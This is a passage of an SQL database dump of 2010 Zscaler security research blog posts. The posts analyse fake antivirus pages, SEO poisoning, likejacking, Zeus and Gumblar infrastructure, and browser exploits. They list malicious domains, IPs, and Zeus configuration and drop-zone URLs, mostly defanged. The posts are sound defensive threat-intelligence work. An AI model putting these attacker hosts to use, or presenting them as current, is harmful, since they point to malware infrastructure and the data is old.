imgwebsearch -- pay these spammers from anywhere from a few cents per click, a few dollars per sign-up/purchase, or in some cases tens of dollars per install (for example, the FakeAV campaigns). There is a good paper from Dmitry Samosseiko from last year\'s Virus Bulletin that details the Partnerka.', 'Advertising;Phishing', 'https://www.zscaler.com/blogs/research/placeblogger-and-others-lead-imgwebsearch-spam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (502, 'Exploit Targeting A 7 Year Old Vulnerability? Really?', 'ThreatLabz', 'July 16, 2010', 'We’ve actually spotted in-the-wild exploitation of “Microsoft Internet Explorer ADODB.Stream Object File Installation Weakness” (Bugtraq ID 10514), a vulnerability first released in 2003. The exploit does get a little more modern as the code also targets vulnerability from 2009 (MS09-002). Here is a screenshot of the live infected page,    The malicious obfuscated JavaScript has been injected at the bottom of webpage. Let’s decode it. Here is the small part of the decoded script.         From the above code, it is clear that it is targeting the ADODB.Stream vulnerability from 2003. Here is the other part of the decoded content which exploits the MS09-002 vulnerability.    I am not going into the more details of this exploit as the code is pretty self explanatory. It is going to download additional malicious binaries and execute them on the system. The author who discovered this older ADODB.Stream vulnerability has posted a proof-of-concept. For those interested, an explanation of the MS09-002 vulnerability can be found here.    Virustotal results for the infected webpage show it being detected by 13 of 41 AV engines – not very impressive results for a seven year old vulnerability. It would appear that no matter how old vulnerabilities are, attackers will still try to leverage them as weapon. Hopefully most people have patched their systems at some point during the past seven years. Sadly, despite the age of the vulnerability, the use of JavaScript obfuscation has made this attack a challenge for AV vendors – a topic that we’ve discussed in the past.    Umesh', 'Vulnerability', 'https://www.zscaler.com/blogs/research/exploit-targeting-7-year-old-vulnerability-really');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (503, 'ATECH-SAGADE Badness - Malicious .IN Campaign', 'ThreatLabz', 'July 15, 2010', 'I\'m working on generating our Q2 2010 Stats and Trends report, and I noticed a large number of blocked exploit kit activity from domains registered with the .IN TLD. These were not hacked sites but domains registered for the explicit purpose of supporting a criminal enterprise. This activity is on-going. As the post will show, the campaign involves leveraging exploit kits to exploit known vulnerabilities on client applications and installing various payloads including installing various wares to monetize pay-per-installs.    A large number of the the malicious domains have been hosted on:    91.188.60.225 - 91.188.60.227    These IPs belong to the 91.188.60.0/24 owned by ATECH-SAGADE:    Which other ATECH-SAGADE netblocks have been described as \"evil\" in blog posts from earlier this month:    \"Evil network: Sagade Ltd / ATECH-SAGADE\" -- Dynamoo    \"Basically, 91.188.59.0 – 91.188.59.255 is completely evil and has no legitimate use as far as I can see.\" -- ComputerSecurityArticles    \"Exploits, Malware, and Scareware Courtesy of AS6851, BKCNET, Sagade Ltd.\" -- ComputerSecurityArticles    There have also been a number of recent malicious sites related to this .IN campaign seen on the 85.234.190.0/24 ATECH-SAGADE netblock as well, for example:  nvild.in  volnv.in  uinge.in  brusd.in  woonv.in  brayx.in  edois.in  which currently resolve to 85.234.190.4, .15, and .16.    Here is a snippet of what we\'ve seen and blocked related to this ongoing .IN campaign:      Other open-source research show several of these sites still live on this /24, for example:  http://support.clean-mx.de/clean-mx/viruses.php?ip=91.188.60.225&sort=id%20desc  http://support.clean-mx.de/clean-mx/viruses.php?ip=91.188.60.226&sort=id%20desc  http://support.clean-mx.de/clean-mx/viruses.php?ip=91.188.60.227&sort=id%20desc    Here is an example of the WHOIS for one of the malicious .IN domains:  Russian based information and self-resolving domain. The name servers currently resolve to 91.188.60.225 and 91.188.60.229 respectively on the same ATECH-SAGADE netblock.    Here is a small snippet from the exploit kit hosted on the .IN domains:  I believe this is from the SUTRA exploit pack. In any case, here is an example of an earlier Wepawet report from analyzing one of these .IN sites:  http://wepawet.iseclab.org/view.php?hash=753106a87a6e72e407c7e7b80164a538&t=1277905162&type=js  The exploits detected from the report are CVE-2009-0927 and CVE-2007-5659  And the ActiveX controls:  CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA  CA8A9780-280D-11CF-A24D-444553540000    While many of the payloads include Trojan Downloaders and FakeAV, there have been some other wares installed via this campaign. VirusTotal has shown that some of the payloads dropped by the kit are undetectable via anti-virus:  http://www.virustotal.com/analisis/bb16ee91e726a4d99e79e1815f539bbac6fc5195a0ef2b9f2d25d5df8ab11148-1277895209    The sigcheck on the artifact shows it as System Explorer by the Mister Group:  Secunia has a brief advisory posted on the Mister Group and their System Explorer here.    The Mister Group has a few pages setup for their System Explorer:  http://www.mistergroup.org/  http://www.systemexplorer.net/        From the above, it seems that this campaign is largely driven by pay-per-install profit.', 'Analysis', 'https://www.zscaler.com/blogs/research/atech-sagade-badness-malicious-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (504, 'Fake Youtube Page Used To Infect Soccer Fans', 'Julien Sobrier', 'July 09, 2010', 'Attackers are using the excitement surrounding the World Cup to attack users. As we\'ve shown earlier, they have posted links to fake live streams on social networks, or used BlackHat SEO spam to infect the top soccer-related searches.    Attackers are constantly changing the way the operate. Recently, I found a malicious page for the search term \"world cup extra time rules\", which does not have the common traits of a spam SEO attack for a fake AV page.    The Google result is actually a fake YouTube page (see screen shot below). The page is comprised of three parts:      	HTML and images display a fake YouTube video page  	Hidden HTML (a  	tag moved outside of the screen) stuffed with keywords for \"world cup extra time rules\" in order to rank well in searches  	   	  	Obfuscated Javascript which redirects the user to a different domain  	  	  	  	  	  	   	                     Fake Youtube page on modeltog.nu      The obfuscated Javascript loads a Flash file which attempts to download files to the user\'s computer and then redirect them to rapidejdr.fr, a hacked site hosted in France. This flash file is detected by 6 out of 41 antivirus vendors as malicious.    The hacked French site then redirects the browser to a fake AV page. I\'ve seen redirections to four different fake AV domains, and only one of them was blocked by Google Safe Browsing - ryuk4.co.cc was blocked while savewarez54.co.cc, richav8.co.cc and richav2.co.cc were not. I also witnessed six different versions of the fake AV page. One seemed to be broken, it displayed the \"loading...\" animation, but did not ultimately deliver fake AV page. Instead, it directly attempted to download the malicious executable. Here is the screen shot of the five variations of the fake AV page:                                           -- Julien', 'Analysis', 'https://www.zscaler.com/blogs/research/fake-youtube-page-used-infect-soccer-fans');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (505, '\'LikeJacking\' - What Is It?', 'ThreatLabz', 'June 28, 2010', 'In the past few days I\'ve had a number of people send me URLs that they received from friends on Facebook that seemed unusual and asked me what is this?  In each of these cases, the answer was \'LikeJacking\' - while this has been discussed in the security community for the last month or so (e.g., Sophos blog post), the general public seems fairly unaware of this technique.  The term has been adopted enough, that there is a Wikipedia page for it, with a very straight-forward definition:For those unfamiliar with Facebook\'s \'Like Button\' - \"The Like button enables users to make connections to your pages and  share content back to their friends on Facebook with one click\" additional details can be read here.Many of the sites involved with LikeJacking are NSFW (contain nudity).  However, below is a recent example of sites that I can safely take some screenshots of (sorry, no nudity on this blog):Example: hxxp://tattooshaha.info/Viewing the source of the site, we can see the META tags used for the information that will propagate to Facebook:And a transparent iframe to for the visitor to \'Like\' the site:Why?  Well the simple answer is to drive up the number of visitors to your site though Facebook \'Like\' advertisement.  For this particular example, clicking on the image directs users to  hxxp://coolest-bathroom.info/tattoo/, and viewing the source of the page shows that JS source is loaded from cpalead.com:The purpose of this campaign appeared to monetize click-throughs with cpalead.com:I\'ve seen this technique in play in a number of other LikeJacking campaigns, e.g.,hxxp://www.101hottestwomen.com/hxxp://102hottestwomen.com/hxxp://103hottestwomen.com/video.htmlhxxp://104hottestwomen.com/video.htmlhxxp://105hottestwomen.com/video.htmlhxxp://106hottestwomen.com/video.htmlhxxp://107hottestwomen.com/video.htmlhxxp://108hottestwomen.com/video.htmlhxxp://109hottestwomen.com/video.htmlhxxp://110hottestwomen.com/video.htmlhxxp://111hottestwomen.com/video.htmlThe source of this one shows that if your visiting from Germany, Finland, or Spain IP you load from cpalead.com, otherwise you load from adscendmedia.com (CPA affiliate):', 'Abuse', 'https://www.zscaler.com/blogs/research/likejacking-what-it');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (506, 'Zeus C&C (Avalanche)', 'ThreatLabz', 'June 25, 2010', 'Recent Zeus C&C activity has been observed from: mnbvicdij4uhdjb5421knnkd.com\r\nAt the time of posting, the domain is not present in ZeusTracker.\r\n\r\nThe domain is currently fluxing (Fast-Flux), notice short TTLs and numerous A records across a number of netblocks (in this case, bots):\r\n\r\nZeus Configuration URLs:\r\nhxxp://mnbvicdij4uhdjb5421knnkd.com/bin/oraha.bin\r\nhxxp://mnbvicdij4uhdjb5421knnkd.com/bin/orahxa.bin\r\nhxxp://mnbvicdij4uhdjb5421knnkd.com/xman/xman.bin\r\n\r\noraha.bin = dfd46f8fdf3084984f57580fbe4f40b9\r\norahxa.bin = dfd46f8fdf3084984f57580fbe4f40b9\r\nxman.bin = f27cb8327406f999fbd60d39d6ad81ea\r\n\r\nZeus Drop Zones:\r\nhxxp://mnbvicdij4uhdjb5421knnkd.com/xman/gogo.php\r\nhxxp://mnbvicdij4uhdjb5421knnkd.com/cp01/zen.php\r\n\r\nDomain Registration Information:\r\nRegistrant Contact:\r\nThe name server domain (dimplemolar.net) has been observed providing name services for other past Zeus domains:\r\nhaijeihefoobeekahkohweto.com\r\neethahchaehiexahgeemaugh.com\r\nziosuovareipheighaisheek.com\r\n\r\nRegistration for the nameserver domain:\r\n\r\nDancho blogs related to carruawau registration information:\r\n\r\nIRS/PhotoArchive Themed Zeus:\r\nns1.hourscanine.com - 87.117.245.9\r\n\r\nKeeping Money Mule Recruiters on a Short Leash:\r\nns1.dimplemolar.net - 207.126.161.29\r\n\r\nInvestigating some of the IPs involved in the fluxing show that they are part of a Zeus botnet.\r\nFor example, DNSBL.abuse.ch shows that 98.214.150.140 resolving the domain kldmten.net which at present has had 547 bot IPs observed supporting this domain.\r\n\r\n\r\nThe botnet infrastructure supporting the fast-flux hosting and name resolution for these Zeus and money mule recruiting campaigns is related to the Avalanche botnet which has been discussed on the PhishLabs blog.', 'Malware', 'https://www.zscaler.com/blogs/research/zeus-cc-avalanche');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (507, 'IPad Beta-Testing Scam', 'ThreatLabz', 'June 25, 2010', 'I saw this being spam advertised on Facebook:Tammi Tyler appears to be a throw-away, spam profile used for this campaign.The bit.ly link takes the follower to:  hxxp://www.theigadget.com/?80af9787Site advertises that you sign-up and beta-test an iPad for 2 months and then get to keep it ... in addition to feeding this spam group with your contact information (step 1 of registration), they also request that you give them your email account password (step 2):The contact info on the page shows:The betatestinginc.com domain was recently parked and theigadget.com domain was registered earlier this month, both use privatewhois.net to mask the registration information.theigadget.com currently resolves to 188.64.184.61 (UKHOST4U), and betatestinginc.com to 216.8.179.23 (NEXT DIMENSION INC).  Here\'s an earlier blog post that mentions someone falling victim to this group for this iPad scam.Googling for the bit.ly link shows it spammed out to Twitter as well:Remember \"if it\'s too good to be true...', 'Uncategorised', 'https://www.zscaler.com/blogs/research/ipad-beta-testing-scam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (508, 'Antivirus Struggling With Obfuscated JavaScript', 'Michael Sutton', 'June 15, 2010', 'As part of our offline research, we regularly test various desktop antivirus (AV) solutions to determine how effective they are at catching web based threats. One segment where I feel that AV has struggled, is with the identification of malicious content when analyzing obfuscated JavaScript. While obfuscated JavaScript can be an indication of malicious content, such as injected IFRAME attacks, the technique is regularly used by legitimate sites. Most notably, we see heavy usage of JavaScript obfuscation among online advertising vendors. JavaScript obfuscation is used by legitimate sites for two reasons. First, code may be obfuscated in an effort to limit the size of the code by removing whitespace and changing variable names in order to make it more efficient. Secondly, sites leverage obfuscation in order to \'protect\' code by making it harder to understand and therefore copy. This latter motivation is of minimal value however as client side content can always be de-obfuscated given a basic level of effort. After all, the browser needs to interpret the code at some point.         JavaScript obfuscation presents a challenge for AV vendors. Despite what marketing literature would suggest, detecting malicious content still heavily relies on the use static signatures. Obfuscation is problematic as signatures cannot detect what they cannot see. This leaves two options. The AV engine can either first de-obfuscate the JavaScript or signatures can be created for obfuscated content. The latter is problematic as even a slight change in the content or encoding algorithm can lead to vastly different output, while de-obfuscation is an imperfect science as those who have used tools such as Malzilla can attest to.              I ran across an obfuscated JavaScript sample recently which illustrates this challenge. The code in question is perfectly legitimate and resides at About.com, a popular website which delivers information on a variety of topics. On a page entitled APR calculator, when looking at the page source, you will note a large block of obfuscated JavaScript within the section of the page.           <script language=\"javascript\">document.write(unescape(\'%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A...               At first glance, this appears to be a classic case of malicious content injected into an otherwise legitimate page. It\'s essentially a large block of hexadecimal encoded characters and it requires a couple of passes to fully decode everything. However, once de-obfuscation is complete, you uncover JavaScript code designed to calculate your mortgage payments...not attack your browser. For those interested in seeing the code in all it\'s glory, please follow the links below.         Obfuscated/De-obfuscated JavaScript files        	Obfuscated JavaScript  	First de-obfuscation pass  	Fully de-obfusctaed JavaScript      Despite the benign nature of this Javascript code, at the time this blog was published, no fewer than 18 of 41 antivirus engines flagged this code as malicious. What does this tell us about how the engines operate? Clearly they are inspecting the obfuscated code as opposed to the de-obfuscated code and flagging based on the existence of certain functions/data. The problem with this approach - while JavaScript obfuscation is used by the bad guys, it\'s used by the good guys as well. Identifying malicious content by statically inspecting obfuscated JavaScript is overly simplistic and as can be seen, is bound to trigger false positives.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/antivirus-struggling-obfuscated-javascript');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (509, 'Robint.us SideNote: \"CuteQQ\"', 'ThreatLabz', 'June 10, 2010', 'A report of the malicious JavaScript on robint.us can be seen in this Wepawet report. I noticed that within the JS, the variable name \"cuteqq\" was used for evaluating the payload - this sounded really familiar. Google \"cuteqq malware\" and 784 results returned ... CuteQQ is actually a browser exploit toolkit that was popular during 2008. Google for \"var cuteqq\" and there are several more interesting results including those marked \"This site may harm your computer.\"    Here is a VirusTotal report for an early version of the CVE-2010-0249 (\"Aurora\") exploit, showing that the malicious binary was authored by the \"Cuteqq Software Team\"      \"Cuteqq\" does seem to have its usage in several Chinese exploits / variable names. (QQ is a popular Chinese web service for email, chat, news, etc.)    VirusTotal analysis of the actual payloads shows that most A/V vendors (including our inline A/V solution) detect the malicious payloads dropped by the infected webservers:      	  	    http://www.virustotal.com/analisis/59433694b9b8da6fe723bc15a00e0dc0c4177ea56ac6d8355aa73ad1c6e7d72c-1276095830    	  	  	    http://www.virustotal.com/analisis/ebd5fbeae8265f088852a916f221f816caf742d3d2f38e014287ce8a82d6f772-1276202168    	      Neither of these payloads attributed themselves to the \"Cuteqq\" team directly within the binary signature / authorship information.    WHOIS information for the two domains related to this incident show CN attribution:', 'Malware', 'https://www.zscaler.com/blogs/research/robintus-sidenote-cuteqq');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (510, 'Robint.us – Case Study In Mass Website Infection', 'ThreatLabz', 'June 10, 2010', 'There have been numerous reports about the IIS/ASP SQL injection compromises that redirected users to ww.robint.us. See below for reading on this incident:\r\n\r\n\r\n	http://www.sophos.com/blogs/sophoslabs/?p=9941\r\n	http://blog.sucuri.net/2010/06/mass-infection-of-iisasp-sites-robint-us.html\r\n	http://nsmjunkie.blogspot.com/2010/06/anatomy-of-latest-mass-iisasp-infection.html\r\n	http://www.shadowserver.org/wiki/pmwiki.php/Calendar/20100609\r\n\r\n\r\n\r\nHowever, many of these posts do not discuss what was seen in terms of impact to actual users. Zscaler has millions of users from around the globe that use our cloud service. From our pool of users, this is what we saw:\r\n\r\n \r\n\r\n\r\n	The first transactions that we saw to ww.robint.us were on June 7, 2010 at 03:56 PT.\r\n	Zscaler became aware of and placed a block on the offending domain within the first 3 hours of the incident. Zscaler\'s inline A/V solution had signatures to detect the payload used prior to the attack.\r\n	To date, we have seen 1071 transactions to ww.robint.us across 71 unique users on 64 unique source IPs. Of the source IPs, 74% were from the United States, 6.5% from India, were from 4.3% from Germany, and the remaining 15.2% were spread across 7 other countries - illustrating the indiscriminate nature of the webserver attacks.  \r\n\r\n\r\n\r\nThe ww.robint.us incident is considered a mass scale incident given that several thousand websites were impacted and used to redirect users to the malicious JavaScript. However, our data shows that a very small pool of our users (less than 1% of 1%) actually had attempted transactions to ww.robint.us, meaning that generally speaking the infected websites were fairly unpopular among our enterprise user base.\r\n\r\nThe below graph charts the transactions, source IPs and users impacted over time. Close to 50% (48.7%) of the transactions and 25% of the users that we saw were in the first 3 hours of the incident.', 'Compromise', 'https://www.zscaler.com/blogs/research/robintus-case-study-mass-website-infection');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (511, 'Comparison Of Malware Protections: Google Safe Browsing, Microsoft SmartScreen, Etc.', 'Julien Sobrier', 'June 10, 2010', 'All modern web browsers now include protections for malware. They include a list of known malicious URLs, and compare each address visited by the user against this list. If the URL is recognized as malicious, a warning message is displayed in place of the HTML page. They also protect against Phishing sites, but I won\'t dive into this feature during this post.SmartScreen Filter warning in Internet ExplorerChrome, Safari and Firefox 3.x use Google SafeBrowsing, while Internet Explorer 8 has SmartScreen Filters and Opera includes lists from Netcraft and TRUSTe. Note that it took Safari more than 20 minutes for SafeBrowsing to start working after I upgraded from Safari 4. It did not show any warning, informing that malware protection was disabled while it was retrieving the database.Safari waning messageI was wondering how well these protections work against current threats. Since antivirus doesn\'t perform well against viruses spread through fake AV pages, fake videos, or against malicious jar files, I wondered if these browser block lists would keep users safe against current spam SEO attacks.I\'ve tried a few domains for each type of attack, using each browser. All the malicious domains were directly identified from within Google search results, using popular search terms.Protection against fake AV pagesI first tried various new fake AV domains as well as subdomains for xorg.pl (hostguard-31p.xorg.pl, hostguard-47p.xorg.pl, ubersaving26.xorg.pl, etc.), a domain that has hosted fake AV pages for months. Browser New domains blocked Xorg.pl subdomains blocked  Firefox 3.6 7/75/5  Internet Explorer 8 2/7 0/5 Opera 10.5 0/7 0/5Google Safe Browsing is very good at blocking fake AV pages. We report  to Google on fake AV domains we identify, which they don\'t block, but we\'re noticing that there are fewer  and fewer which they don\'t already block.Protection against fake video codecsThis type of malicious pages seem to have staged a come back and we\'re seeing them more and more frequently since last week-end. In this scenario, the user is tricked into downloading an executable disguised as a video codec or new flash version. Browser Urls blocked  Firefox 3.6 2/6  Internet Explorer 8 5/6 Opera 10.5 0/6Internet Explorer did a great job at flagging the fake video  sites. Google Safe browsing, surprisingly had a very low rate of success.Protection against Java/PDF/Flash exploitsThe number of Java exploits has also increased dramatically over the past few weeks.BrowserUrls blockedFirefox  3.62/4Internet Explorer 81/4Opera 10.50/4Opera did not flag any of the malicious sites. Their security  blacklists may be targeting phishing only. To make sure the security  notification worked, I attempted to visit a phishing site and Opera did  warn me.Opera phishing warning--  Julien', 'Microsoft;Malware', 'https://www.zscaler.com/blogs/research/comparison-malware-protections-google-safe-browsing-microsoft-smartscreen-etc');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (512, 'Fake Video Codecs Replacing Fake AV Pages', 'Julien Sobrier', 'June 08, 2010', 'We\'ve recently  seen fake AV pages being replaced by fake video pages - malicious  pages showing a Flash based video player, along with an error telling the user that he has to  download a new codec to play the video. This is certainly not a new  technique used by attackers, but it is interesting to see that these attacks are showing up on the same pages that were previously used to deliver a fake antivirus attacks.Fake video pageThese  malciious pages are accessed from spam SEO links on Google results. For  example, hxxp://cghiggins.com/index.php/?bomp=17th+amendment  appears on the first page for the search term \"17th amendment\", a popular  search term on June 7th. This link redirects to the domain www2.realcleaner23p.co.cc.  This domain name is typical of a fake AV page - it contains a term  related to antivirus (clean) with a number, like virtually all such  malicious domains that we\'ve seen. Spam link to the malicious  domainThe  title of the page is the same as the fake AV page: Security Threat  Analysis. The source code is also similar - an HTML page with no  content, and an external Javascript file that contains the visual  elements as well as the malicious code. The user is prompted with an  executable to download, which will install the \"missing\" codec in order to watch  the video. This is of course a virus.The malicious domain is not (yet?) blocked  by Google SafeBrowsing, and no warning is displayed in the search  results. The malicious executable is currently flagged by 10  antivirus vendors out of 41.-- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/fake-video-codecs-replacing-fake-av-pages');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (513, 'New Fake AV Pages', 'Julien Sobrier', 'June 04, 2010', 'There have been a number of changes in the world of Search Engine Optimization (SEO) poisoning attacks. I reported yesterday that there we\'re seeing ever more dangerous exploits using Flash and Java.We\'re now also finding new types of fake AV pages. While these pages are visually similar to the previous fake AV pages, the source code is very different. The Javascript code is more compact and is included inline with the HTML page. New fake AV pageMost of these new fake AV pages are hosted on porntube-nowx.com. The spam SEO urls look different and are harder to spot because they now look like regular URLs for static HTML pages. The malicious executable associated with the attack is currently detected by 10 antivirus vendors of 40.Interestingly, some of the hacked sites that were used to redirect users from Google to Java/Flash exploits are now used to redirect to this new fake AV page.-- Julien', 'Phishing', 'https://www.zscaler.com/blogs/research/new-fake-av-pages');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (514, 'Spam SEO: Use Of Java/Flash Leads To More Dangerous Exploits', 'Julien Sobrier', 'June 02, 2010', 'Most malicious sites behind spam Search Engine Optimization (SEO) poisoning attacks lead to fake antivirus pages. The malicious sites rely on social engineering, tricking users into thinking their computer is infected and require user interaction to execute and install the malicious file, which is disguised as an anti-virus program.    Well hidden exploits    Over the past 3 days, we\'ve seen some even more dangerous websites using Java exploits and Flash vulnerabilities. These malicious pages do not require any user interaction to infect users. They are also very difficult to detect - the exploits are hidden behind several layers of Javascript redirects and use obfuscation. Also, the attackers allow each IP address to receive the malicious page one time only. After a user or a security tool accesses the malicious domain, any subsequent requests coming from the same IP address get redirected to different, harmless pages. This makes post-infection analysis, and the use of security tools almost useless. You have to make sure that you hit the right page, the right way (correct headers, referer header, form data, etc.) the first time or the exploit will not be revealed. Popular online security scanners like JSunpack or Wepawet cannot be used since all requests to the malicious sites are done from the same IP address.           Spam SEO Page leading to a Flash exploit      Java exploit    Mike reported a 300 percent increase of Java exploits last month. These new pages are very similar to what we saw before. A malicious JAR file is launched automatically through a Java ActiveX control vulnerability on Internet Explorer, or through the Java Quick Starter, which is installed silently on Firefox with a recent Java Plugin update. The malicious JAR files are not flagged by most antivirus vendors.    Like all spam SEO, the attack starts with legitimate sites being hacked. New pages are added to target popular search terms, in order to appear in the first few pages of a Google search. When a user clicks on spam SEO links, he actually gets redirected to a different URL such as  hxxp://www.hutriken.com/nvu_y/hqpa_b_.php. This page checks to determine if the browser supports Java, and if so, sends the following form with automatically:                            Detection of Java capabilities      The next page (the 4th HTTP request) contains both inline obfuscated Javascript, and an external script (obfuscated as well). Once deobfuscated, the exploit is very simple - it invokes the ActiveX control or the Java Quick Starter with the URL of the malicious JAR file.                            Deobfuscated java exploit code      If the user, or the security tool, fails at any stage to have the appropriate prerequisites (lacking certain browser capabilities, multiple requests to same page, etc.), it gets redirected to http://google.com/.    Flash exploit    The flash exploit is not as well hidden as the Java exploit, and it is found on fewer links. It consists of a single page with obfuscated Javascript.                                      Obfuscated Flash exploit           The exploit uses a heap spray technique via ActionScript. We\'ve posted an extended analysis of this type of exploit back in December. Like the Java exploit, no user interaction is needed for the exploit to run.                                                     Deobfuscated exploit                          -- Julien', 'Analysis;Encryption;Phishing;Vulnerability', 'https://www.zscaler.com/blogs/research/spam-seo-use-javaflash-leads-more-dangerous-exploits');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (515, 'Infected Javascript File', 'Julien Sobrier', 'June 01, 2010', 'When legitimate sites are hacked, attackers usually modify the existing HTML pages to add their own code (obfuscated Javascript or invisible IFRAMEs), or add new fake pages to the site. The additional code is commonly found after the </html> tag, before the <html> tag, or just after the <body> tag. Since most sites do not use Javascript obfuscation, these hijacking attempts are often not too hard to spot. Even if a site use Javascript obfuscation to hide e-mail addresses, these harmless pieces of code are much smaller than your typical malicious code, and often use just one escape statement.    We also occasionally see instances where static Javascript files are hijacked. These are often much harder to detect. We recently found the following malicious code appended to a static Javascript file on an Indian Telecom website:             Obfuscated Javascript appended to legitimate code      With the help of Malzilla, I\'ve analyzed the Javascript code. It attempts to download another Javascript file from gumblar.cn, a known malicious site.                                                          Deofuscation of one malicious function     Hijacking a static file is much harder than modifying a dynamic page. Many content management systems (Joomla, Drupal, etc.) and blogs (Wordpress, etc.) are hacked through an SQL injection, or through a privilege escalation, which gives attackers access to the templates or the SQL database used to generate the dynamic pages, but does not provide access to static files. An attacker must have greater access to the infected host, as given by a remote PHP file inclusion for example, or the ability to access any sensitive file in order to successfully perform this type of attack.         -- Julien', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/infected-javascript-file');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (516, 'A Brief Gumblar Infrastructure Analysis', 'ThreatLabz', 'May 27, 2010', 'Earlier this week, I had a request to analyze and describe why we were blocking customer access to:    hxxp://www.fdotfirstcoastouterbeltway.com/index.asp  (note: this page has since been cleaned)    Analysis of the page showed obfuscated JS after the closing HTML tag on the page. The obfuscated JS decoding report is available at JSunpack here. The injected JS decodes and creates an object on the page to pull content from:    hxxp://westcountry.ru:8080/google.com/deviantart.com/google.gr.php    A dig on the domain, shows that it round-robins to IPs across a number of providers with a short time-to-live (TTL) - or Fast-Fluxed:    westcountry.ru. 432 IN A 213.186.47.177 (OVH)  westcountry.ru. 432 IN A 88.198.49.197 (Hetzner)  westcountry.ru. 432 IN A 94.23.220.163 (OVH)  westcountry.ru. 432 IN A 174.137.179.244 (WebAir)  westcountry.ru. 432 IN A 188.72.212.104 (ImajHost)    Likewise, westcountry.ru is resolved from multiple name servers across a number of providers:    nserver: ns1.hostdnssite.com. (67.23.25.78)  nserver: ns2.hostdnssite.com. (67.223.233.101)  nserver: ns3.hostdnssite.com. (93.103.5.146)  nserver: ns4.hostdnssite.com. (86.49.83.234)    The domain for the name server (hostdnssite.com) was recently registered through OnlineNIC, and is used to provide domain resolution for numerous other domains involved in this malware campaign. A DomainTools preview shows that there are 49 other domains resolved by these name servers:  Reviewing our logs for other blocked \"ru:8080/\" transactions, showed the URL: furryentry.ru:8080/google.com/thesun.co.uk/iciba.com.php    Analyzing the page revealed these related pages:    furryentry.ru:8080/index.php?pid=1&home=1  furryentry.ru:8080/jquery.jxx?ver=2.1.5  furryentry.ru:8080/Notes1.pdf <-- Malicious    Uploading the malicious PDF to VirusTotal, showed very poor A/V detection results (only 1 of 41 vendors detect): VT report. Using Wepawet for a quick analysis of the malicious PDF shows that it has routines to exploit CVE-2008-2992 and CVE-2009-0927. And drops shellcode to call out to:    hxxp://waxytooth.ru:8080/welcome.php?id=6&pid=1&hello=503    All of the domains involved used the hostdnssite.com name server. Also many of the WHOIS records had similarities, such as the email address, telephone number, name, or location (usually Russia). For example, hostdnssite.com WHOIS:  A registrant search for \'Ekaterina Gilmanova\' for example shows 558 domains (and a Google search shows the related malicious domain results). Additional open source analysis shows a large number of involved domains (reference: 1, 2, 3) within this campaign. The name server previously used to resolve some of the related domains was FREEHOSTINTERNET.COM - which now has a Hold on it from OnlineNIC. The majority of the domains that I\'ve analyzed relate to the Gumblar botnet and there were a few one-off domains that related to fake pharmacy and money-mule campaigns. What is interesting is that the freehostinginternet.com name servers were also allegedly used in another malware campaign: Koobface (reference: 1). In other words, this identified infrastructure is likely supporting multiple campaigns (and possibly criminal groups).    Building out the list of domains and related IPs involved shows the tip of the iceberg as it relates to this underground infrastructure.    Sample of domains extracted:  Sample of IPs extracted:  The above analysis provides a peek inside some of Gumlar\'s supporting infrastructure. Also, while it\'s still a bit unclear, there appears to be some evidence that portions of the underground infrastructure that\'s supported Gumblar has also been used to support other campaigns.', 'Malware', 'https://www.zscaler.com/blogs/research/brief-gumblar-infrastructure-analysis');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (517, 'Fake Antivirus: Your Blacklist And Antivirus Do Not Protect You', 'Julien Sobrier', 'May 25, 2010', 'We have spent a fair bit of time discussing fake AV pages as they represent approximately 60% of the malicious content associated with Search Engine Optimization (SEO) attacks, according to Google. As shown in past Zscaler blog posts, it is not uncommon for Google to include malicious links in the first 10 pages of search results.    Users can do very little to spot these malicious links. Google shows a warning for only a small percentage of overall results, even days after malicious links first emerge, and antivirus browser plugins such as AVG tend to show such links as safe.           AVG plugin shows this link as safe. It is actually a redirection to a fake AV page         Browsers include blacklists of phishing and malicious sites. Firefox and Chrome use Google SafeBrowsing, while Internet Explorer uses SmartScreen Filter. Everytime the browser loads a URL, the web address is checked against a list of known bad sites to stop the user from going to a malicious destination.         Google SafeBrowsing has a pretty good history of blacklisting fake AV domains. We share with then  lists of fake AV pages we discover with Google as we find that they do not block them 100% of the time.         Let\'s look an one example. The terms \"marisol terrazas\" was very popular on May 19th (she\'s a singer in the band Los Horoscopos de Durango who got married that day, apparently). On the first result page, all links are malicious! They all redirected to a fake AV page. But Google shows a warning for only two these links. Worse still, my antivirus plugin shows all of them as safe!             All the links of the first page are malicious!         Fortuantely, 4 these links are currently down. The 6 other links lead to fake AV pages on two different domains: www1.bestdefender-51p.xorg.pl and www1.bestdefender-68p.xorg.pl. Neither Google SafeBrowsing on Firefox nor SmatScreen Filter on Internet Explorer 8 blocked any of these fake AV pages.         Your antivirus will very likely fail you again when the malicious executable file is downloaded: only 12 out 41 AV vendors find anything 